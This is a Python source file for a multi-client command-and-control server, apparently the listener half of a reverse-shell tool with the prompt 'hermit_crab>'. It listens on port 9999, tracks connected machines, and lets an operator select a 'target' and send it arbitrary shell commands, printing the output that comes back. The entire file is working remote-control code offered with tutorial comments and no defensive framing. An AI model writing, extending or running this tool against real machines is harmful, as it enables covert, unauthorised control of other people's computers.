import socket
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket (Allows two computers to connnect)

def socket_create():
    try:

        # Define the host well as socket and port for binding
        global host
        global port
        global s

        # Host is empty because this is server file
        host = ''

        # Use any port number other than known ones.
        port = 9999

        # Attach socket function to variable we just defined
        s = socket.socket()

    # Handle try statement if socket doesn't work
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port and wait for connection from client
def socket_bind():
    # Try binding the socket
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))

        # Server listens up to 5 connections before refusing connections
        s.listen(5)

    # Handle the try statement
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")

        # If function fails use recursion and call it again until it binds.
        socket_bind()


# Accept connections from multiple clients and save to list
def accept_connections():
    # Go over all the connections and close them
    for c in all_connections:
        c.close()
    # Create fresh list of connections and addresses after you re-run the program
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            # Try to add connection
            conn, address = s.accept()
            # No timeout
            conn.setblocking(1)
            # Add connection and address data to their lists
            all_connections.append(conn)
            all_addresses.append(address)
            # Print connected computer's IP Address
            print("\nConnection has been established " + address[0])
        except:
            print("Error accepting connections")


# Interactive prompt for sending commands remotely
def start_hermit_crab():
    while True:
        # Create custom command prompt
        cmd = input('hermit_crab> ')
        # If list is typed list all the connections
        if cmd == 'list':
            # List all the connections
            list_connections()
        # If select is entered in command line
        elif 'select' in cmd:
            # Get the specific connection object
            conn = get_target(cmd)
            # Check for disconnections and send commands if there is connection
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")


# Displays all current connections
def list_connections():
    # Result is empty at the beginning
    results = ''
    # Loop through each connection and give them number using enumerate function
    for i, conn in enumerate(all_connections):
        # Try sending blank message to the connection to check if they are accessible
        try:
            conn.send(str.encode(' '))
            # Check if you can receive connection.If you can connection is valid.
            conn.recv(20480)
        except:
            # If validation fails delete them from connection and address list
            del all_connections[i]
            del all_addresses[i]
            # Go to the next connection
            continue
        # If connection is successful show the user connected device IP Address and Port Number
        results += str(i) + '  ' + str(all_addresses[i][0] + '   ' + str(all_addresses[i][1]) + '\n')
    print('-----Clients-----' + '\n' + results)


# Select a target client
def get_target(cmd):
    try:
        # Change cmd output to empty line
        target = cmd.replace('select ', '')
        target = int(target)
        # Connection object equals to specific computer
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        # Change custom cmd dir to specific IP so you know which section you are in
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        # If user tries to pick invalid connection number
        print("Not a valid suggestion")
        return None


# Connect with remote target client
def send_target_commands(conn):
    while True:
        # While true listen for commands
        try:
            cmd = input()
            # If command length is more than 0
            if len(str.encode(cmd)) > 0:
                # Send the command
                conn.send(str.encode(cmd))
                # Get client response
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            # If input is quit break
            if cmd == 'quit':
                break
        except:
            # If client breaks the connection break
            print("Connection was lost")
            break


# Create worker threads
def create_workers():
    # Two threads
    for _ in range(NUMBER_OF_THREADS):
        # Assign task to the thread
        t = threading.Thread(target=work)
        # Do not change to false because it would carry on running in the background
        t.daemon = True
        # Start the thread
        t.start()


# Do the next job in the queue (1 handles the connections, 2 handles the commands)
def work():
    while True:
        # x equals to task number
        x = queue.get()
        # If x equals to task 1
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        # If x equals to task 2
        if x == 2:
            start_hermit_crab()
        # Inform the queue that task is done
        queue.task_done()


# Each list item is a new task
def create_jobs():
    # Go over the list of tasks to do
    for x in JOB_NUMBER:
        # Put that item to queue for processing
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
